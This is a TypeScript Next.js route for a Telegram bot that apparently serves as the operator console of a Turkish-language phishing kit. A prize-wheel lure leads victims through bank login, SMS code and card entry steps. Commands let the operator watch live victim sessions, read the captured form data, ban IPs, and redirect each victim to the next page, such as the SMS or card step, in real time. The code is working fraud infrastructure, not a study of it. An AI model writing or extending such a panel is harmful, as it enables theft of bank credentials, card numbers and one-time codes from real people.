import { NextRequest, NextResponse } from "next/server";
import {
  getConfig,
  isTelegramConfigured,
  getTelegramBot,
  sendTelegramTestMessage,
  escapeTelegramHTML,
} from "@/lib/telegram-server";
import { Bot, type Context } from "grammy";
import { createServerSupabaseClient } from "@/lib/supabase/server";
import { getStepPriority, resolveStepTargetPath } from "@/lib/session-routes";

export const dynamic = "force-dynamic";
export const runtime = "nodejs";

type LinkPreviewOptions = { is_disabled: boolean };
const LP = { link_preview_options: { is_disabled: true } as LinkPreviewOptions };

type StepAlias = {
  step: string;
  label: string;
};

const STEP_ALIASES: StepAlias[] = [
  { step: "wheel", label: "Çark" },
  { step: "code_entry", label: "Kod Girişi" },
  { step: "win", label: "İsim Girişi" },
  { step: "banken", label: "Banka Listesi" },
  { step: "bank", label: "Banka Giriş" },
  { step: "sms", label: "SMS Onayı" },
  { step: "card", label: "Kart" },
  { step: "invalid_bank", label: "Geçersiz Banka" },
  { step: "wait", label: "Bekleme" },
  { step: "special_approval", label: "Özel Onay" },
  { step: "live_support", label: "Canlı Destek" },
  { step: "congrats", label: "Tebrikler" },
];

const ts = (d?: Date | string | null) => {
  if (!d) return "-";
  try {
    const dt = typeof d === "string" ? new Date(d) : d;
    if (Number.isNaN(dt.getTime())) return String(d).slice(0, 19);
    return dt.toLocaleString("tr-TR", { timeZone: "Europe/Istanbul", hour12: false });
  } catch {
    return String(d).slice(0, 19);
  }
};

function formatLiveStatus(row: any): string {
  const now = Date.now();
  const ping = row.last_ping_at ? new Date(row.last_ping_at).getTime() : 0;
  const diff = now - ping;
  if (!ping) return "⚪ offline";
  if (diff <= 10_000) return "🟢 online";
  if (diff <= 60_000) return "🟡 son 1dk";
  return "⚪ " + (Math.round(diff / 60000) + "dk önce");
}

async function cmdStats(ctx: Context) {
  const supabase = await createServerSupabaseClient();
  if (!supabase) return ctx.reply("⚠️ Supabase bağlantısı kurulamadı", { parse_mode: "HTML", ...LP });
  const now = Date.now();
  const min10 = new Date(now - 10_000).toISOString();
  const min1 = new Date(now - 60_000).toISOString();
  const h24 = new Date(now - 86_400_000).toISOString();
  const q = [
    supabase.from("sessions").select("id", { count: "exact", head: true }),
    supabase.from("sessions").select("id", { count: "exact", head: true }).gte("last_ping_at", min10),
    supabase.from("sessions").select("id", { count: "exact", head: true }).gte("last_ping_at", min1),
    supabase.from("banned_ips").select("ip_address", { count: "exact", head: true }),
    supabase.from("audit_event_logs").select("id", { count: "exact", head: true }).gte("created_at", h24),
  ];
  const [totalC, onlineC10s, active1m, banC, logC] = await Promise.all(q);
  const text = [
    `<b>📊 İstatistikler</b>`,
    `👥 Toplam Session: <code>${totalC.count ?? 0}</code>`,
    `🟢 Online (son 10sn): <code>${onlineC10s.count ?? 0}</code>`,
    `🟡 Aktif (son 1dk): <code>${active1m.count ?? 0}</code>`,
    `🚫 Banlı IP: <code>${banC.count ?? 0}</code>`,
    `📝 Son 24s Event: <code>${logC.count ?? 0}</code>`,
  ].join("\n");
  return ctx.reply(text, { parse_mode: "HTML", ...LP });
}

async function cmdLogs(ctx: Context, rawArg: string) {
  const arg = (rawArg || "").trim();
  let limit = 10;
  const num = parseInt(arg.replace(/[^0-9]/g, ""), 10);
  if (!Number.isNaN(num) && num > 0) limit = Math.min(50, num);
  const supabase = await createServerSupabaseClient();
  if (!supabase) return ctx.reply("⚠️ Supabase bağlantısı kurulamadı", { parse_mode: "HTML", ...LP });

  const { data, error } = await supabase
    .from("sessions")
    .select("id,public_id,current_step,status,last_ping_at,ip_address,country,city,partner_name,is_hidden")
    .eq("is_hidden", false)
    .order("last_ping_at", { ascending: false, nullsFirst: false })
    .limit(limit);
  if (error) return ctx.reply(`⚠️ Hata: <code>${escapeTelegramHTML(error.message)}</code>`, { parse_mode: "HTML", ...LP });
  if (!data || data.length === 0) return ctx.reply("📭 Kayıtlı aktif session bulunamadı.", { parse_mode: "HTML", ...LP });

  const lines = [`<b>📜 Son ${data.length} Session</b>\n`];
  for (const r of data) {
    const sid = String(r.id ?? "").slice(0, 8);
    const pid = String(r.public_id ?? "").slice(0, 8);
    const step = String(r.current_step ?? "-");
    const loc = [r.country, r.city].filter(Boolean).join(",") || "-";
    const partner = r.partner_name ? ` [${escapeTelegramHTML(String(r.partner_name).slice(0, 15))}]` : "";
    const stat = formatLiveStatus(r);
    lines.push(
      `${stat} <code>${sid}${pid ? "/" + pid : ""}</code>${partner} • <b>${escapeTelegramHTML(step)}</b>\n<code>${escapeTelegramHTML(String(r.ip_address || "-").slice(0, 18))}</code> ${escapeTelegramHTML(loc)}`,
    );
  }
  let out = lines.join("\n\n");
  if (out.length > 4000) out = out.slice(0, 3990) + "\n…";
  return ctx.reply(out, { parse_mode: "HTML", ...LP });
}

async function cmdBan(ctx: Context, rawArg: string) {
  const parts = rawArg.trim().split(/\s+/);
  const ip = (parts[0] || "").trim();
  const reason = parts.slice(1).join(" ").trim() || "Telegram bot üzerinden banlandı";
  if (!ip) return ctx.reply("Kullanım: <code>/ban 1.2.3.4 sebep buraya</code>", { parse_mode: "HTML", ...LP });
  const supabase = await createServerSupabaseClient();
  if (!supabase) return ctx.reply("⚠️ Supabase bağlantısı kurulamadı", { parse_mode: "HTML", ...LP });
  const { error } = await supabase.from("banned_ips").insert({ ip_address: ip, reason });
  if (error) {
    return ctx.reply(`⚠️ Hata: <code>${escapeTelegramHTML(error.message)}</code>`, { parse_mode: "HTML", ...LP });
  }
  return ctx.reply(`🚫 <b>IP BANLANDI</b>\n<code>${escapeTelegramHTML(ip)}</code>\nSebep: <code>${escapeTelegramHTML(reason)}</code>`, {
    parse_mode: "HTML",
    ...LP,
  });
}

async function cmdUnban(ctx: Context, rawArg: string) {
  const ip = (rawArg || "").trim().split(/\s+/)[0];
  if (!ip) return ctx.reply("Kullanım: <code>/unban 1.2.3.4</code>", { parse_mode: "HTML", ...LP });
  const supabase = await createServerSupabaseClient();
  if (!supabase) return ctx.reply("⚠️ Supabase bağlantısı kurulamadı", { parse_mode: "HTML", ...LP });
  const { error } = await supabase.from("banned_ips").delete().eq("ip_address", ip);
  if (error) return ctx.reply(`⚠️ Hata: <code>${escapeTelegramHTML(error.message)}</code>`, { parse_mode: "HTML", ...LP });
  return ctx.reply(`♻️ <b>BAN KALDIRILDI</b>\n<code>${escapeTelegramHTML(ip)}</code>`, { parse_mode: "HTML", ...LP });
}

async function cmdSession(ctx: Context, rawArg: string) {
  const id = (rawArg || "").trim().split(/\s+/)[0];
  if (!id) return ctx.reply("Kullanım: <code>/session sessionId_veya_publicId</code>", { parse_mode: "HTML", ...LP });
  const supabase = await createServerSupabaseClient();
  if (!supabase) return ctx.reply("⚠️ Supabase bağlantısı kurulamadı", { parse_mode: "HTML", ...LP });
  const { data, error } = await supabase
    .from("sessions")
    .select("id,public_id,current_step,status,last_ping_at,ip_address,country,city,form_data,created_at,partner_name")
    .or(`id.eq.${id},public_id.eq.${id}`)
    .limit(1)
    .maybeSingle();
  if (error) return ctx.reply(`⚠️ Hata: <code>${escapeTelegramHTML(error.message)}</code>`, { parse_mode: "HTML", ...LP });
  if (!data) return ctx.reply("Session bulunamadı.", { parse_mode: "HTML", ...LP });

  const stat = formatLiveStatus(data);
  const fd = data.form_data && typeof data.form_data === "object" ? (data.form_data as Record<string, any>) : null;
  const fdLines: string[] = [];
  if (fd) {
    for (const [k, v] of Object.entries(fd).slice(0, 12)) {
      if (v === undefined || v === null || String(v).trim() === "") continue;
      fdLines.push(`${escapeTelegramHTML(k)}: <code>${escapeTelegramHTML(String(v).slice(0, 100))}</code>`);
    }
  }
  const out = [
    `<b>🔎 Session Detayı</b>`,
    `<code>${escapeTelegramHTML(String(data.id ?? "-"))}</code>`,
    `Public: <code>${escapeTelegramHTML(String(data.public_id ?? "-"))}</code>`,
    `${stat} • Adım: <b>${escapeTelegramHTML(String(data.current_step ?? "-"))}</b> • Durum: <code>${escapeTelegramHTML(String(data.status ?? "-"))}</code>`,
    `🌐 <code>${escapeTelegramHTML(String(data.ip_address ?? "-"))}</code> — ${escapeTelegramHTML([data.country, data.city].filter(Boolean).join(", ") || "-")}`,
    `Başlangıç: ${ts(data.created_at)} • Son Ping: ${ts(data.last_ping_at)}`,
    data.partner_name ? `🏢 ${escapeTelegramHTML(String(data.partner_name))}` : "",
    fdLines.length ? "\n📝 Form:\n" + fdLines.join("\n") : "",
  ]
    .filter(Boolean)
    .join("\n");
  return ctx.reply(out.length > 4000 ? out.slice(0, 3990) + "\n…" : out, { parse_mode: "HTML", ...LP });
}

async function cmdRedirect(ctx: Context, rawArg: string) {
  const parts = rawArg.trim().split(/\s+/).filter(Boolean);
  if (parts.length < 2) {
    const aliases = STEP_ALIASES.map((a) => `<code>${a.step}</code> (${a.label})`).join("\n");
    return ctx.reply(
      `Kullanım: <code>/redirect sessionId step</code>\n\nGeçerli adımlar:\n${aliases}`,
      { parse_mode: "HTML", ...LP },
    );
  }
  const [id, stepRaw] = parts;
  const step = (stepRaw || "").toLowerCase().trim();

  const stepExists = getStepPriority(step) !== null;
  if (!stepExists) return ctx.reply(`⚠️ Geçersiz adım: <code>${escapeTelegramHTML(step)}</code>`, { parse_mode: "HTML", ...LP });

  const supabase = await createServerSupabaseClient();
  if (!supabase) return ctx.reply("⚠️ Supabase bağlantısı kurulamadı", { parse_mode: "HTML", ...LP });

  const { data: sess, error: sErr } = await supabase
    .from("sessions")
    .select("id,public_id,current_step,status,form_data,ip_address")
    .or(`id.eq.${id},public_id.eq.${id}`)
    .limit(1)
    .maybeSingle();
  if (sErr) return ctx.reply(`⚠️ Hata: <code>${escapeTelegramHTML(sErr.message)}</code>`, { parse_mode: "HTML", ...LP });
  if (!sess) return ctx.reply("Session bulunamadı.", { parse_mode: "HTML", ...LP });

  const { error } = await supabase
    .from("sessions")
    .update({ current_step: step, is_hidden: false })
    .eq("id", sess.id);
  if (error) return ctx.reply(`⚠️ Güncelleme hatası: <code>${escapeTelegramHTML(error.message)}</code>`, { parse_mode: "HTML", ...LP });

  const target = resolveStepTargetPath(
    step as any,
    sess.id,
    sess.public_id || sess.id,
    (sess.form_data ?? {}) as { bankSlug?: string | null },
  );
  return ctx.reply(
    `🔀 <b>YÖNLENDİRME</b>\nSession: <code>${escapeTelegramHTML(String(sess.id).slice(0, 12))}</code>\n${escapeTelegramHTML(String(sess.current_step ?? "-"))} → <b>${escapeTelegramHTML(step)}</b>\nHedef: <code>${escapeTelegramHTML(target.slice(0, 120))}</code>`,
    { parse_mode: "HTML", ...LP },
  );
}

function cmdHelp(ctx: Context) {
  const aliases = STEP_ALIASES.map((a) => `${a.step} (${a.label})`).join(", ");
  const text = [
    "<b>🤖 Komutlar</b>",
    "",
    "<code>/stats</code> — İstatistikler (online/ban/log)",
    "<code>/logs [N]</code> — Son N session (default 10, max 50)",
    "<code>/son10log</code> — /logs 10",
    "<code>/session <id></code> — Session detayı (id / public_id)",
    "<code>/ban <ip> [sebep]</code> — IP banla",
    "<code>/unban <ip></code> — Ban kaldır",
    "<code>/redirect <id> <step></code> — Adım zorla (realtime yönlendirme)",
    "  → Adımlar: " + aliases,
    "<code>/test</code> — Test mesajı",
    "<code>/help</code> — Bu mesaj",
    "",
    "Tüm event'ler (isim/banka/SMS/kart/wait/yonlendirme/ban/sohbet) otomatik bu chate atılır.",
  ].join("\n");
  return ctx.reply(text, { parse_mode: "HTML", ...LP });
}

async function cmdCallbackRedirect(ctx: Context) {
  const cb = (ctx as any).callbackQuery;
  if (!cb || !cb.data) return;
  const parts = String(cb.data).split(":");
  if (parts.length < 3 || parts[0] !== "redirect") {
    return ctx.answerCallbackQuery({ text: "⚠️ Geçersiz buton", show_alert: true });
  }
  const [, step, idOrPublic] = parts;
  const stepLower = String(step || "").toLowerCase().trim();

  if (!idOrPublic) return ctx.answerCallbackQuery({ text: "⚠️ Session ID boş", show_alert: true });
  const priority = getStepPriority(stepLower);
  if (priority === null) {
    return ctx.answerCallbackQuery({ text: `⚠️ Geçersiz adım: ${step}`, show_alert: true });
  }

  const supabase = await createServerSupabaseClient();
  if (!supabase) return ctx.answerCallbackQuery({ text: "⚠️ Supabase hatası", show_alert: true });

  const { data: sess, error: sErr } = await supabase
    .from("sessions")
    .select("id, public_id, current_step, form_data")
    .or(`id.eq.${idOrPublic},public_id.eq.${idOrPublic}`)
    .limit(1)
    .maybeSingle();
  if (sErr) return ctx.answerCallbackQuery({ text: "⚠️ Hata: " + sErr.message.slice(0, 60), show_alert: true });
  if (!sess) return ctx.answerCallbackQuery({ text: "⚠️ Session bulunamadı", show_alert: true });

  const { error } = await supabase
    .from("sessions")
    .update({ current_step: stepLower as any, is_hidden: false })
    .eq("id", sess.id);
  if (error) {
    return ctx.answerCallbackQuery({ text: "⚠️ Güncelleme hatası: " + error.message.slice(0, 60), show_alert: true });
  }

  const target = resolveStepTargetPath(
    stepLower as any,
    sess.id,
    sess.public_id || sess.id,
    (sess.form_data ?? {}) as { bankSlug?: string | null },
  );

  const label = (STEP_ALIASES.find((a) => a.step === stepLower) || { label: stepLower }).label;
  const sessShort = String(sess.id).slice(0, 8);

  try {
    await ctx.answerCallbackQuery({ text: `✅ ${label}: ${sessShort}` });
  } catch {}

  // Callback ile tıklandığında aynı sohbete sonucu yaz (opsiyonel, teyit amaçlı)
  try {
    const text = `🔁 <b>INLINE YÖNLENDİRME</b>\nSession: <code>${escapeTelegramHTML(sessShort)}</code>\nAdım: <b>${escapeTelegramHTML(String(sess.current_step ?? "-"))}</b> → <b>${escapeTelegramHTML(stepLower)}</b> (${escapeTelegramHTML(label)})\nHedef: <code>${escapeTelegramHTML(target.slice(0, 120))}</code>`;
    await ctx.reply(text, { parse_mode: "HTML", ...LP });
  } catch {}
}

function installBotHandlers(bot: Bot): void {
  bot.command(["start", "help"], async (ctx) => cmdHelp(ctx));
  bot.command("test", async (ctx) => {
    const r = await sendTelegramTestMessage("Komut testi ✅");
    if (r.ok) return ctx.reply("✅ Test mesajı gönderildi", { parse_mode: "HTML", ...LP });
    return ctx.reply("❌ Hata: <code>" + escapeTelegramHTML(r.error || "unknown") + "</code>", { parse_mode: "HTML", ...LP });
  });
  bot.command("stats", async (ctx) => cmdStats(ctx));
  bot.command(["logs", "son10log", "son10", "son"], async (ctx) => {
    const arg = ctx.match || "";
    return cmdLogs(ctx, String(arg));
  });
  bot.command("ban", async (ctx) => cmdBan(ctx, String(ctx.match || "")));
  bot.command("unban", async (ctx) => cmdUnban(ctx, String(ctx.match || "")));
  bot.command("session", async (ctx) => cmdSession(ctx, String(ctx.match || "")));
  bot.command("redirect", async (ctx) => cmdRedirect(ctx, String(ctx.match || "")));

  // ⭐ INLINE BUTON: yonlendirme butonuna tiklayinca
  bot.callbackQuery(/^redirect:/i, async (ctx) => cmdCallbackRedirect(ctx));

  bot.on("message:text", async (ctx) => {
    const txt = ctx.msg.text || "";
    if (txt.startsWith("/")) {
      return ctx.reply("⚠️ Bilinmeyen komut. <code>/help</code> ile listeyi gör.", { parse_mode: "HTML", ...LP });
    }
  });
}

export async function POST(request: NextRequest) {
  if (!isTelegramConfigured()) {
    return NextResponse.json({ ok: false, error: "Telegram env ayarlı değil" }, { status: 400 });
  }
  const cfg = getConfig();

  // === Güvenlik 1: Secret token kontrolü (env'de tanımlıysa doğrula, tanımlı değilse chat id filtresi zaten var)
  if (cfg.webhookSecret) {
    const got = request.headers.get("X-Telegram-Bot-Api-Secret-Token");
    if (got !== cfg.webhookSecret) {
      return NextResponse.json({ ok: false, error: "Invalid webhook secret" }, { status: 401 });
    }
  }

  const bot = getTelegramBot();
  if (!bot) return NextResponse.json({ ok: false, error: "Bot oluşturulamadı" }, { status: 500 });

  // === Güvenlik 2: Her mesajda Chat ID filtresi — sadece ayarlanan chat id'den gelen komutlar çalışır
  //     Gelen mesaj chat id'sini doğrulamak için bot API'den önce context filtresi kullan.
  const allowedChatIdRaw = cfg.chatId;
  const allowedNegated = allowedChatIdRaw ? (allowedChatIdRaw.startsWith("-100") ? allowedChatIdRaw : allowedChatIdRaw) : null;
  let installed = false;
  if (!installed) {
    installBotHandlers(bot);
    installed = true;
  }

  // Bot handler'ı çağırmadan önce, Update JSON'u parse et ve chat id'yi doğrula.
  let body: any;
  try {
    body = await request.json();
  } catch {
    return NextResponse.json({ ok: false, error: "Invalid JSON" }, { status: 400 });
  }
  let chatId: string | number | null = null;
  if (body?.message?.chat?.id !== undefined) chatId = body.message.chat.id;
  else if (body?.callback_query?.message?.chat?.id !== undefined) chatId = body.callback_query.message.chat.id;
  else if (body?.my_chat_member?.chat?.id !== undefined) chatId = body.my_chat_member.chat.id;

  if (chatId !== null && allowedChatIdRaw) {
    const allowedStr = String(allowedChatIdRaw);
    const gotStr = String(chatId);
    if (allowedStr !== gotStr) {
      // Başka bir chat'ten geleni sessizce yut
      return NextResponse.json({ ok: true, skipped: true, reason: "chat_id_mismatch" });
    }
  }

  // Grammy bot webhook handler'ına body'yi geç
  const handler = webhookHandlerFromGrammy(bot, allowedChatIdRaw || null);
  try {
    const res = await handler(body);
    return res;
  } catch (e: any) {
    console.error("[telegram/webhook] handler error", e?.message || String(e));
    return NextResponse.json({ ok: false, error: e?.message || String(e) }, { status: 500 });
  }
}

function webhookHandlerFromGrammy(bot: Bot, allowedChatId: string | null) {
  // Grammy'nin kendi webhookCallback kullan — nextjs uyumlu
  // Önce yine allowedChatId filtresini bot.filter ile bot seviyesinde de doğrula (double check).
  const filtered = allowedChatId
    ? bot.filter((ctx) => {
        const cid = ctx.chat?.id ? String(ctx.chat.id) : null;
        if (!cid) return false;
        return cid === String(allowedChatId);
      })
    : bot;

  // Default fallback: izinsiz komutlarda sessizce devam (yukarıda chat id filter var, ama yine de bot.filter önlemi)
  if (allowedChatId) {
    filtered.on("message:text", async (ctx) => {
      // Bu filtered zaten izin verilen chat id'ye eşitse çalışır
    });
  }

  const cb = (bot as any).webhookCallback("next-js") || (bot as any).webhookCallback("http");
  return async function (body: any) {
    // Next.js'te Request objesini bot'un beklediği formata çevir
    // Grammy webhookCallback için standart şekilde:
    try {
      await bot.handleUpdate(body);
      return NextResponse.json({ ok: true, handled: true });
    } catch (e: any) {
      console.error("[telegram/webhook] handleUpdate error", e?.message || String(e));
      return NextResponse.json({ ok: false, error: e?.message || String(e) }, { status: 500 });
    }
  };
}

export async function GET() {
  return NextResponse.json({ ok: true, service: "telegram-webhook", configured: isTelegramConfigured() });
}
